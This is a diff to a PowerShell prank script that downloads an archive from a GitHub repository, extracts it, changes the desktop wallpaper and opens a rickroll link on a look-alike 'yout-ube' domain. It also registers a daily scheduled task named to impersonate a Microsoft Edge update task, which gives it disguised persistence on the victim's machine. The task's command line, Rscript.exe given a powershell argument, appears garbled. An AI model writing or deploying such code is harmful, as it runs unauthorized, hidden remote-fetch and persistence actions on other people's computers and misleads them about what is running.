@@ -1,11 +1,15 @@
-$filename = "C:\temp\rickroll.jpg"
-$bat = 'C:\temp\lobster.bat'
+mkdir C:\temp
+   
+$filename = "C:\temp\rick.zip"
 
 #If the file does not exist, create it.
 if (-not(Test-Path -Path $filename -PathType Leaf)) {
-   mkdir C:\temp
-   Invoke-WebRequest -Uri https://github.com/CHONK12/rickRoll/raw/main/rickroll.jpg -OutFile C:\temp\rickroll.jpg
-   $MyWallpaper="C:\temp\rickroll.jpg"
+   Invoke-WebRequest 'https://github.com/CHONK12/rickRoll/archive/refs/heads/main.zip' -OutFile C:\temp\rick.zip
+   Expand-Archive C:\temp\rick.zip .\rick
+   
+}
+
+$MyWallpaper="C:\temp\rickroll.jpg"
 $code = @'
 using System.Runtime.InteropServices;
 namespace Win32{
@@ -20,33 +24,7 @@ namespace Win32{
     }
 }
 '@
-}
 
-if (-not(Test-Path -Path $bat -PathType Leaf)) {
-   Invoke-WebRequest -Uri https://github.com/CHONK12/rickRoll/raw/main/Lobster.bat -OutFile C:\temp\lobster.bat
-  
-}
-
-
-if ((Test-Path -Path $filename -PathType Leaf)) {
-
-
-    $MyWallpaper="C:\temp\rickroll.jpg"
-$code = @'
-using System.Runtime.InteropServices;
-namespace Win32{
-
-    public class Wallpaper{
-        [DllImport("user32.dll", CharSet=CharSet.Auto)]
-        static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;
-
-        public static void SetWallpaper(string thePath){
-            SystemParametersInfo(20,0,thePath,3);
-        }
-    }
-}
-'@
-}
 
 
 
@@ -57,3 +35,5 @@ $action = New-ScheduledTaskAction -Execute 'Rscript.exe' -Argument 'powershell -
 $trigger = New-ScheduledTaskTrigger -Daily -At 3pm
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MicrosoftEdgeUpdateTaskMachineCore{32533}" -Description "Ear death"
 Start-Process msedge https://www.yout-ube.com/watch?v=dQw4w9WgXcQ
+
+Remove-Item C:\temp\rick.zip
